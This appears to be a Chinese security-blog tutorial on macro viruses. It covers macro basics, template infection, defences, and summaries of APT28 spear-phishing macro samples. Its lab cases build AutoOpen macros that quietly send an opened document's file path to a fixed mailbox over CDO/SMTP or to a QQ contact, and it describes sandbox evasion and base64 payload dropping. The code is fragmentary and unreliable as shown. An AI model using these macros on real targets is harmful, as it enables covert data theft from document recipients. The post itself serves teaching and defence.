系统安全 十九 宏病毒 之 入门 基础 防御 措施 自发 邮件 及 apt28 宏 样本 分析 您 可能 之前 看到过 我 写 的 类似 文章 为什么 还要 重复 撰写 呢 只是 想 更好 地 帮助 初学者 了解 病毒 逆向 分析 和 系统安全 更加 成 体系 且不 破坏 之前 的 系列 因此 我 重新 开 设了 这个 专栏 准备 系统 整理 和 深入 学习 系统安全 逆向 分析 和 恶意代码 检测 系统安全 系列 文章 会 更加 聚焦 更加 系统 更加 深入 也是 作者 的 慢慢 成长史 换 专业 确实 挺 难 的 逆向 分析 也是 块 硬骨头 但我 也 试试 看看 自己 未来 四年 究竟 能 将它 学到 什么 程度 漫漫 长征路 偏向虎山行 享受 过程 一起 加油 作者 前文 介绍 了 病毒 原理 和 防御 知识 并 通过 批处理 代码 和 漏洞 cve 利用 让 大家 感受 下 病毒 攻击 的 过程 提 出了 安全 相关 建议 这篇 文章 将 详细 讲解 宏病毒 相关 知识 它 仍然 活跃 于 各个 apt 攻击 样本 中 具体内容 包括 宏病毒 基础 原理 防御 措施 自发 邮件 及 apt 样本 分析 这些 基础 性知识 不仅 和 系统安全 相关 同样 与 我们 身边 常用 的 软件 文档 操作系统 紧密联系 希望 这些 知识 对 您 有所 帮助 更 希望 大家 提高 安全意识 安全 保障 任重道远 本文 参考 了 参考文献 中 的 文章 并 结合 自己 的 经验 和 实践 进行 撰写 也 推荐 大家 阅读 参考文献 文章 目录 一 什么 是 宏 基础 概念 安装 配置 录制 新 宏 案例 二 宏病毒 宏病毒 基础 自动 宏 案例 宏病毒 感染 三 宏病毒 的 自我 保护 与 防御 四 案例 cdo 自发 邮箱 五 案例 qq 发送 信息 六 apt 攻 击中 的 宏病毒 oz 鱼叉 邮件 酒店 行业 鱼叉 邮件 研究机构 鱼叉 邮件 七 总结 从 年月 开始 我 来 到了 一个 陌生 的 专业 网络空间 安全 初 入 安全 领域 是 非常 痛苦 和 难受 的 要 学 的 东西 太多 涉及面 太 广 但 好在 自己 通过 分享 篇 网络安全 自学 系列 文章 艰难 前行 着 感恩 这一 年 相识 相知 相 趣 的 安全 大佬 和 朋友们 如果 写得 不好 或 不足之处 还请 大家 海涵 接下来 我 将 开启 新 的 安全 系列 叫 系统安全 也是 免费 的 篇文章 作者 将 更加 深入 的 去 研究 恶意 样本 分析 逆向 分析 内网 渗透 网络 攻防 实战 等 也 将 通过 在线 笔记 和 实践 操作 的 形式 分享 与 博 友 们 学习 希望 能与 您 一起 进步 加油 推荐 前文 网络安全 自学 篇 系列 篇 作者 的 github 资源 逆向 分析 网络安全 前文 分析 系统安全 一 什么 是 逆向 分析 逆向 分析 基础 及 经典 扫雷 游戏 逆向 系统安全 二 如何 学好 逆向 分析 及 吕布 传 游戏 逆向 案例 系统安全 三 idapro 反汇编 工具 初识 及 逆向 工程 解密 实战 系统安全 四 ollydbg 动态 分析 工具 基础 用法 及 crakeme 逆向 系统安全 五 ollydbg 和 cheatengine 工具 逆向 分析 植物 大战 僵尸 游戏 系统安全 六 逆向 分析 之 条件 语句 和 循环 语句 源码 还原 及 流程 控制 系统安全 七 逆向 分析 之 pe 病毒 原理 c 实现 文件 加解密 及 ollydbg 逆向 系统安全 八 windows 漏洞 利 用之 cve 复现 及 蓝屏 攻击 系统安全 九 windows 漏洞 利 用之 ms 远程 代码 执行 漏洞 复现 及 深度 提 权 系统安全 十 windows 漏洞 利 用之 smbv 服务 远程 代码 执行 漏洞 cve 复现 系统安全 十一 那些 年 的 熊猫 烧香 及 pe 病毒 行为 机理 分析 系统安全 十二 熊猫 烧香 病毒 ida 和 od 逆向 分析 上 病毒 初始化 系统安全 十三 熊猫 烧香 病毒 ida 和 od 逆向 分析 中 病毒 释放 机理 系统安全 十四 熊猫 烧香 病毒 ida 和 od 逆向 分析 病毒 释放 过程 下 系统安全 十五 chrome 浏览器 保留 密码 功能 渗透 解析 蓝屏 漏洞 及 某 音乐 软件 漏洞 复现 系统安全 十六 pe 文件 逆向 基础知识 pe 解析 pe 编辑 工具 和 pe 修改 系统安全 十七 windowspe 病毒 概念 分类 及 感染 方式 详解 系统安全 十八 病毒 攻防 机理 及 winrar 恶意 劫持 漏洞 脚本 病毒 自启动 定时 关机 蓝屏 攻击 系统安全 十九 宏病毒 之 入门 基础 防御 措施 自发 邮件 及 apt 宏 样本 分析 声明 本人 坚决 反对 利用 教学方法 进行 犯罪 的 行为 一切 犯罪行为 必将 受到 严惩 绿色 网络 需要 我们 共同 维护 更 推荐 大家 了解 它们 背后 的 原理 更好 地 进行 防护 该 样本 不会 分享 给 大家 分析 工具 会 分享 参考文献 见 后 一 什么 是 宏 基础 概念 宏 macro 是 一种 批量 处理 的 称谓 是 指 能 组织 到 一起 作为 独立 的 命令 使用 的 一系列 word 命令 可以 实现 任务 执行 的 自动化 简化 日常 的 工作 microsoftoffice 使用 进行 宏 的 编写 大家 可能 接触到 的 宏 并不多 但 如果 经常 使用 word 文档 时 可能会 遇到 宏 比如 国家 自然科学基金 申请 或者 作者 之前 分享 的 宏 技巧 文章 如下 officewpsexcel 通过 添加 宏 实现 多张 表格 合并 黑 科技 wps 通过 vb 宏 函数 实现 自 编号 功能 注 意在 office 中 可以 直接 使用 word 的 宏 函数 而 wps 需要 安装 相关 的 软件 后 才能 使用 打开 wpsword 如 下图 所示 宏 是 不能 使用 的 安装 配置 这时 需要 下载 vbaforwps 并 安装 才能 使用 下载 地址 为 第 篇 下载安装 如 下图 所示 安 装完 后 可以 设置 宏 函数 如 下图 所示 点击 宏 然后 创建 宏 函数 如 下图 所示 取名为 test 创建 后 如 下图 所示 可以 看到 是 vb 代码 进行 编写 的 代码 示例 如下 subtest 行号 文字 dimnlinenum 行号 数值 dimiaslongtitle 输入 编号 信息 a 请 输入 总 编号 开始 号 binputbox atitle endsubwps 可以 保存为 带 宏 函数 的 格式 如 下图 所示 然后 运行 宏 函数 如 下图 所示 点击 运行 即可 如 下图 所示 运行 结果 如 下图 所示 弹出 界面 输入 录制 新 宏 案例 第一步 降低 宏 的 安全性 宏 的 默认 安全性 非常 高 有时会 导致 宏程序 不会 自动 执行 我们 可以 修改 降低 其 安全性 第二步 设置 字体 隐藏 假设 我们 现在 有 这样 一个 需求 要将 文档 中 的 内容 隐藏 怎么做 呢 传统 方法 是 全选 文字 然后 设置 字体 隐藏 如 下图 所示 如果 需要 查看 文字 再 进行 还原 这 些小 技巧 往往会 隐 藏在 病毒 或 木马 中 那么 我们 是否 可以 将 这 隐藏 和 还原 两个 操 作用 两个 快捷键 关联 起来 呢 下次 再进 行 相关 操作 时会 变得 更加 简洁 第三步 点击 录制 新 宏 第四步 将 刚才 的 操作 执行 一遍 全选 文字 然后 隐藏 然后 点击 停止 录制 此时 可以 看到 我们 新创建 的 宏 macrohide 第五步 再 录制 一个 显示 的 新 宏 macroshow 显示 之后 我们 停止 录制 第六步 绑定 快捷键 如果是 在 office 中 可以 直接 选择 对应 的 快捷键 但 wps 设置 不同 wps 设置 如下 点击 文件 gt 选项 在 选项 界面 最 左侧 找到 并 点击 自定义 功能 区 选择 自定义 按钮 设置 快捷键 如下 macrohide 对应 对应 ctrlshifts 此时 功能 已经 实现 当 我们 按 下 ctrlshifth 时 文字 隐藏 按 下 ctrlshifts 时 文字 显示 当然 宏 可以 更加 复杂 接下来 我们 将 介绍 同时 怎么 去 查看 宏代码 呢 通过 vb 编辑器 能够 查看 宏代码 如 下图 所示 在 normal 下 的 模块 gtnewmacros 有 我们 刚刚 编辑 的 两个 宏 该 代码 的 核心内容 如下 全选 功能 selectionfont 字体 设置 hidden 隐藏 属性 设置 为 macrohidemacro 宏 由 xiuzhang 录制 时间 二 宏病毒 宏病毒 基础 那么 什么 又是 宏病毒 呢 宏病毒 是 一种 寄 存在 文档 或 模板 的 宏 中 的 计算机病毒 存在于 数据文件 或 模板 中 字处理 文档 数据 表格 数据库 演示 文档 等 使用 宏 语言 编写 利用 宏 语言 的 功能 将 自己 寄生 到 其他 数据 文档 最早 的 时候 人们认为 数据 文档 是 不可能 带有 病毒 的 因为 数据 文档 不 包含 指令 直到 宏病毒 出现 才 改变 大家 的 看法 当 我们 打开 这样 的 文档 其中 的 宏 就会 被执行 于是 宏病毒 就 会被 激活 转移到 计算 机上 并 驻 留在 normal 模板 上 从此以后 所有 自动 保存 的 文档 都会 感 染上 这种 宏病毒 而且 如果 其他用户 打 开了 感染 病毒 的 文档 宏病毒 又会 转移 到他 的 计算 机上 那么 宏病毒 又 如何 获得 这些 控制权 呢 只有 拿到 控制 前 之后 宏病毒 才能 进行 传播 它 和 office 的 特性 相关 office 支持 一些 自动 执行 的 宏 如果 将 病毒 代码 放到 自动 执行 的 宏 中 word 打开 时 会给 病毒 传播 创造条件 利用 自动 执行 宏 将 病毒 代码 写在 宏 汇 中 由于 这些 宏 会 自动 执行 从而 获取 控制权 wordautoopen 打开 word 文档 autoclose 关闭 word 文档 autoexec 打开 word 程序 word 文档 和 word 程序 区别 autoexit 退出 word 程序 autonew 新建 宏 自动 宏 案例 我们 通过 vb 编辑器 增加 宏代码 定义 了 五个 自动 宏 第 一个是 新建 文件 autonew 第二个 是 退出 程序 autoexit 第三个 关闭 文档 autoclose 第四个 打开文档 autoexec 第五个 打开 程序 autoexec 注意 程序 指 wps 或 office 一个 程序 可以 打开 或 创建 多个 文档 他们 存在 一定 区别 同样 它们 的 权限 也有 区别 代码 如下 subautoopen msgbox 您好 您 打 开了 word 文档 宏病毒 测试 msgbox 您好 您 打 开了 word 程序 宏病毒 测试 msgbox 您好 您 选择 了 新建 文件 宏病毒 测试 msgbox 欢迎 下次 光临 宏病毒 测试 msgbox 下次 还 要来 哦 宏病毒 测试 欢迎光临 xxxxxx 安全 实验室 宏病毒 测试 模块 文件名 显示 模板 文件 的 名字 调出 助手 手 当 我们 打开 word 时会 提示 我们 安全 警告 选择 启用 宏 此 时会 提示 一个 打开 word 文档 的 对话框 表示 autoopen 宏 自启动 当 我们 关闭程序 会 提示 如下 对话框 如果 我们 想要 查看 宏 的 具体 定义 可以 查看 定义 的 函数 如 下图 所示 也 可以 在 工具栏 中 选择 vb 编辑器 查看 代码 当 我们 执行 某个 函数 会有 对应 的 执行 效果 比如 弹出 宏病毒 测试 对话框 你 可能会 疑惑 为什么 只 弹 出了 两个 对话框 呢 因为 宏 包括 两种 类型 局部 宏 和 全局 宏 而 退出 word 程序 和 进入 word 程序 不是 当前 文档 能 定义 的 其他 三个 宏 无法 起到 作用 我们 需要 将 它们 复制到 normal 模块 中 才能 运行 宏病毒 感 染在 word 和 其他 微软 office 系列 办公 软件 中 宏 分为 两种 内建 宏 局部 宏 位于 文档 中 对 该 文档 有效 如 文档 打开 autoopen 保存 打印 关闭 等 全局 宏 位于 office 模板 中 为 所有 文档 所 共用 如 打开 word 程序 autoexec 宏病毒 的 传播 路线 如下 单机 单个 office 文档 gtoffice 文档 模板 gt 多个 office 文档 文档 到 模块 感染 网络 电子邮件 居多 首先 office 文档 被 感染 病毒 当 文档 打 开会 执行 自动 宏 如果 宏 被执行 它 会去 检测 当前 模板 是否 被 感染 病毒 如果 没有 被 感染 它 会将 释放 自身 的 病毒 代码 当 模板 被 感染 之后 系统 中 任何 一个 文档 被 打开 都会 执行 模板 中 的 病毒 宏病毒 进行 传播 宏病毒 的 感染 方案 就是 让 宏 在这 两类 文件 之间 互相 感染 即 数据 文档 文档 模板 下面 是 软件 安全 课程 的 示例 图 注意 宏代码 是 可以 调试 的 完整 代码 如下 subtest 以上 是 病毒 基本 的 自我 保护措施 取 当前 活动 文档 中 工程 组件 集合 取 word 默认 模板 中 工程 组件 集合 该 字符串 相当于 一个 病毒感染 标志 virusname 将 当前 病毒 代码 导 出到 cjackiesys 文件 保存 i 检查 模板 是否 已经 被 感染 病毒 j 检查 当前 活动 文档 是否 已被 感染 病毒 如果 模板 没有 被 感染 对 其 进行 感染 从 cjackiesys 将 病毒 导入 模板 自动 保存 模板 以免 引起 用户 怀疑 如果 当前 活动 文档 没有 被 感染 从 cjackiesys 将 病毒 导入 当前 活动 文档 自动 保存 当前 活动 文档 宏病毒 也 可以 通过 网络 进行 传播 譬如 电子邮件 mellisa 病毒 自动 往 outlook 邮件 用户 地址 簿 中 的 前 位 用户 发送 病毒 副本 叛逃 者 病毒 也 集 成了 感染 office 文档 的 宏病毒 感染 功能 并且 可以 通过 outlook 发送 病毒 副本 三 宏病毒 的 自我 保护 与 防御 宏病毒 的 自我 保护 主要 包括 三种 方法 禁止 提示 信息 如果 发生 错误 不 弹出 出错 窗口 继续 执行 下面 语句 不 弹出 警告 窗口 不 显示 状态栏 以免 显示 宏 的 运行 状态 关闭 病毒 保护 功能 运 行前 如果 包含 宏 不 提示 屏蔽 命令 菜单 不允许 查看 宏 通过 特定 宏 定义 subviewvbcode 该 过程 和 viewvbcode 函数 一样 如果 用户 按 工具栏 上 的 小图标 就会 执行 这个 过程 disable 或者 删除 特定 菜单项 用 来使 工具 宏 菜单 失效 的 语句 commandbars tools controls enabledfalse 隐藏 宏 的 真实 病毒 代码 在 自动 宏 中 不包括 任何 感染 或 破坏 的 代码 但 包 含了 创建 执行 和 删除 新 宏 实际 进行 感染 和 破坏 的 宏 的 代码 将 宏代码 字体 颜色 设置成 与 背景 一样 的 白色 等 宏病毒 的 防御 措施 包括 一旦 发现 计算机 office 软件 打开 后 弹出 系统 警告 框 并且 无法 另存为 就 表示 该 文件 已 感染 宏病毒 此时 不能 再 打开 其他 文件 否则 病毒 也 会 感染 应 马上 关闭 删除 该 文件 若 文件 重要 不能 删除 则 需用 杀毒软件 全盘 扫 面 处理 感染 文件 开启 禁用 宏 进行 防止 再次 感染 病毒 在 受 信任 位置 中 删除 可靠 来源 列表框 中 的 不安全 来源 根据 实际情况 设置 是否 信任 所有 安装 的 加载 项 和 模板 设置 宏 的 安全性 安装 杀毒软件 打全 系统 补丁 是 预防 计算机病毒 的 基本 措施 当然 也 适用于 宏病毒 除此 这些 常规 手段 之外 宏病毒 还有 专门 的 防治 措施 在线 沙箱 检测 文档 是否 宏病毒 四 案例 cdo 自发 邮箱 接下来 我们 制作 一个 宏 当 对方 打开文档 时 就 知道该 文档 在 对方 电脑 存储 的 具体 路径 常见 方法 包括 邮件 组件 如 cdo 组件 远程 脚本 这里 采用 cdo 自发 邮件 实现 通过 wordvb 编写 脚本 设置 文档 打开 时 运行 利用 cdo 发送 电子邮件 将 文件 的 路径 和 名字 发送到 指定 邮箱 中 具体步骤 如下 利用 autoopen 执行 并 打开文档 时 运行 利用 获取 文件 信息 利用 cdo 实现 电子邮件 实现 信息 传递 注意 千万别 小瞧 这个 功能 如果是 一封 钓鱼 邮件 或 运行 宏病毒 自动 采集 个人电脑 信息 发送至 指定 邮件 其 危害性 非常大 而且 该 攻击 手段 广泛 存在于 许多 亚洲 apt 组组 中 参考文献 宏病毒 使用 cdo 自动 发邮件 良 月 廿七 word 宏病毒 通过 邮件 获取 路径 和 文件名 braylon 宏 的 基本概念 与 使用 whumooc 宏 amp 一个 简单 的 宏病毒 示例 erio 定义 的 宏 函数 为 autoopen 如 下图 所示 核心 代码 如下 所示 完整 代码 如下 包括 获取 文件夹 路径 定义 邮件地址 添加 cdo 库 设置 微软 服务器 cdo 邮件 参数设置 发送 数据 subautoopen autoopen 宏 bycsdneastmount 获取 文件夹 路径 wordapplication docpath 定义 邮件地址 添加 cdo 库 cdomessage 微软 服务器 网址 msgbox 发送 邮件 发送 端口 item smtpcomsmtp 服务器 地址 item smtp 服务器 端口 item 是否 开启 用户名 密码 验证 item from 发送 方 邮箱 名称 item password 发送 方 邮箱 密码 item true 是否 使用 ssl 协议 item 时 延 updateendwith 发送 数据 成功 endsub 当 testdoc 文件 打开 时 它会 自动 运行 其 结果 如 下图 所示 接着 对话框 提示 发送 邮件 最终 邮件 通过 宏病毒 发送 成功 下图 可见 成功 将 word 稳定 打开 的 路径 地址 发送 到了 目标 邮箱 如果 宏病毒 再 获取 更 详细 的 信息 或 文件 是否 也 能 发送到 指定 邮箱 呢 这样 的 恶意代码 仍 需要 重视 注意事项 及 常见 错误 如果在 撰写 宏病毒 过程中 出现 缺少 列表 分隔符 或 我们 需要 进行 调试 及 修改 如果 提示 邮件 无法 发送到 smtp 服务器 传输 错误代码 为 x 服务器 响 应为 notavailable 则 需要 开启 stmp 授权 cdo 发送 邮件 时 需要 开启 邮件 的 stmp 授权 代理 网易 邮箱 设置 方法 如 下图 所示 如果 腾讯 邮箱 要 开启 smtppop 服务 则将 生成 的 授权 码 当作 邮箱 登陆密码 来 进行 邮件 发送 注意 设置 的 是 授权 码 而 不是 密码 如果 wps 报 activex 不能 创建 对象 则 解决方法 参考 五 案例 qq 发送 信息 接着 通过 qq 发送 信息 来 制作 宏病毒 并 获取 对方 电脑 存储 的 具体 路径 具体 流程 获取 文件 路径 将 路径 复制 至 剪贴板 发送 qq 消息 通过 sendkeys 输入 ctrlv 发送 粘贴 内容 注意 腾讯 webqq q 停止 运营 了 且 不好 获取 qq 的 聊天 窗口 句柄 才 采 用了 该 方法 该 部分 主要 参考 师弟 的 代码 再次 感谢 完整 宏代码 如下 subautoopen 获取 文件 路径 result 将 内容 送入 剪贴板 newcbfcebeaaaba 发送 qq 消息 号码 搁置 s 粘贴 运行 代码 如下 获 取了 word 文档 的 路径 此时 内容 复制 至 剪贴板 如果 输入 ctrlv 输出 内容 如下 通过 下面 的 命令 可以 直接 打开 某个 qq 的 窗口 号码 最终 当 我们 打开 word 文档 它会 执行 自动 代码 并向 某个 qq 号 自动 发送 信息 运行 效果 如 下图 所示 六 apt 攻 击中 的 宏病毒 最后 分享 先知 社区 关于 apt 样本 的 宏病毒 分析 和 作者 的 这篇 文章 基础知识 非常 相关 如果 该 部分 有 不当 的 地方 可以 提醒 我 删除 感谢 参考文献 apt 样本 分析 之 宏病毒 分析 apt 组织 是 一个 与 els 有关 的 高级 攻击 团伙 本次 分析 的 是 该 团伙 使用 的 宏病毒 所有 资料 均 来自 互联网 比如 年月 到 月 oz 外交 处理事务 组织 的 鱼叉 邮件 paloalto 年月 到 月 酒店 行业 的 鱼叉 邮件 fireeye 年月 mg 研究机构 的 鱼叉 邮件 ciscooz 鱼叉 邮件 文件名称 crashlist lionairboeing 创建 时间 z 文件 大小 kb 字节 基本 方法 打开文档 会 进行 远程 模板 加载 使用 这种 攻击 首先 初始 文件 不会有 明显 的 恶意代码 并且 可以 收集 受害者 的 ip 一旦 攻击 成功 就 关闭 服务器 难以 追踪 首先 远程 模板 的 位置 注 意在 分析 恶意 样本 时 千万别 访问 这些 远程 链接 或 文件 很可能 中 病毒 或 成为 肉鸡 通过 宏代码 分析 发现 其 没有 进行 混淆 工作 但是 这次 使用 autoclose 只有 文档 关闭 的 时候 恶意代码 才会 执行 从 而会 绕过 一些 不 关闭 文档 的 沙箱 检测 此次 宏 文件 一共 会 创建 两个 文件 如下 所示 分 别是 从 和 中提 取出来 使用 base 编码 的 恶意 文件 environ appdata msdnmsdnenviron temp tempdocm 选择 userform 窗体 右键 保存 后 可以 看到 里面 经过 base 编码 的 恶意 文件 将 msdn 和 tempdocm 写入 后 开始 加载 tempdocm 再运行 tempdocm 的 moduleproc 最后 可以 看到 通过 shell 运行 释放 exe 酒店 行业 鱼叉 邮件 文件名称 创建 时间 z 文件 大小 kb 字节 基本 方法 针对 特定 的 攻击 目标 对 内容 进行了 定制 化 处理 样本 使用 wmi 调用 rundllexe 启动 首先 样本 运行 完 如下 可以 看到 针对 特定 的 攻击 目标 对 内容 进行了 特定 的 定制 化 分析 宏代码 发现 宏代码 是 加密 过 的 解密 可以 看到 三个 函数 攻击者 并没有 做 太多 的 混淆 而是 将 关键 的 pe 文件 base 编码 放到 xml 文件 中 包括 autoopen decodebase base execute 获取 指定 xml 节点 的 信息 最后 在 docpropsappxml 中 发现了 这个 base 编码 的 文本 之后 将 base 文本文件 解码 解密 后为 一个 pe 文件 发 现将 样本 放到 appdata 环境变量 的 目录 下文 件 名为 userdat 最后 使 用了 wmi 调用 rundllexe 启动 研究机构 鱼叉 邮件 文件名称 创建 时间 文件 大小 kb 字节 基本 方法 针对 特定 的 攻击 目标 对 内容 进行了 定制 化 处理 样本 base 解码 设置 bat 脚本 并 启动 样本 运行 完 如下 可以 看到 针对 特定 的 攻击 目标 对 内容 进行了 特定 的 定制 化 对 宏代码 进行了 加密 解密 可以 看到 三个 函数 攻击者 并没有 做 太多 的 混淆 而是 将 关键 的 可执行文件 分 散放 编码 放到 文件 属性 中 autoopen decodebase base execute 将 base 数据 放 到了 word 的 内置 属性 中 合并 获取 的 编码 值 并 解码 最后 设置 bat 脚本 然后 启动 七 总结 写到 这里 这篇 宏病毒 基础性 文章 就 介绍 结束 了 包括 入门 基础 防御 措施 自发 邮件 及 apt 样本 分析 希望 对 您 有所 帮助 后续 作者 还会 继续 深入分析 宏病毒 并 结合 实例 和 防御 进行 讲解 作者 作为 网络安全 初学者 的 慢慢 成长 路 吧 希望 未来 能 更 透彻 撰写 相关 文章 同时 非常感谢 参考文献 中 的 安全 大佬 们 的 文章 分享 感谢 小伙伴 和 师傅 们 的 教导 深知 自己 很菜 得 努力 前行 一 什么 是 宏 基础 概念 安装 配置 录制 新 宏 案例 二 宏病毒 宏病毒 基础 自动 宏 案例 宏病毒 感染 三 宏病毒 的 自我 保护 与 防御 四 案例 cdo 自发 邮箱 五 案例 qq 发送 信息 六 apt 攻 击中 的 宏病毒 oz 鱼叉 邮件 酒店 行业 鱼叉 邮件 研究机构 鱼叉 邮件 学 安全 一年 认识了 很多 安全 大佬 和 朋友 希望 大家 一起 进步 这篇 文章 中 如果 存在 一些 不足 还请 海涵 作者 作为 网络安全 和 系统安全 初学者 的 慢慢 成长 路 吧 希望 未来 能 更 透彻 撰写 相关 文章 同时 非常感谢 参考文献 中 的 安全 大佬 们 的 文章 分享 感谢 师傅 实验室 小伙伴 的 教导 深知 自己 很菜 得 努力 前行 编程 没有 捷径 逆向 也没有 捷径 它们 都是 搬 砖 活 少 琢磨 技 巧干 就 对了 什么时候 你 把 攻击 对手 按在 地上 摩擦 你 就 赢了 也 会 慢慢 形 成了 自己 的 安全 经验 和 技巧 加油 吧 少年 希望 这个 路线 对 你 有所 帮助 共勉 欢迎 大家 讨论 是否 觉得 这 系列 文章 帮助 到 您 如果 存在 不足之处 还请 海涵 任何 建议 都可以 评论 告知 读者 共勉 逆向 分析 网络安全 年月 新开 的 娜 璋 ai 安全 之家 主要 围绕 python 大数 据分析 网络空间 安全 人工智能 web 渗透 及 攻防 技术 进行 讲解 同时 分享 ccfsci 南 核 北 核 论文 的 算法 实现 娜 璋 之家 会 更加 系统 并 重构 作者 的 所有 文章 从 零 讲解 python 和 安全 写了 近十年 文章 真心 想把 自己 所学 所 感 所做 分享 出来 还请 各位 多多指教 真诚 邀 请您 的 关注 谢谢 byeastmount 星期四 凌晨 夜 于 贵阳 参考文献 小伙伴 们 的 分享 软件 安全 课程 实验 详见 网易 云 课程 whu 宏 的 基本概念 与 使用 whumooc 宏病毒 使用 cdo 自动 发邮件 良 月 廿七 word 宏病毒 通过 邮件 获取 路径 和 文件名 braylon 宏 amp 一个 简单 的 宏病毒 示例 样本 分析 之 宏病毒 分析 先知 社区 宏病毒 研究 实战 研究 篇 i 春秋 老师 通过 添加 宏 实现 多张 表格 合并 黑 科技 wps 通过 vb 宏 函数 实现 自 编号 功能 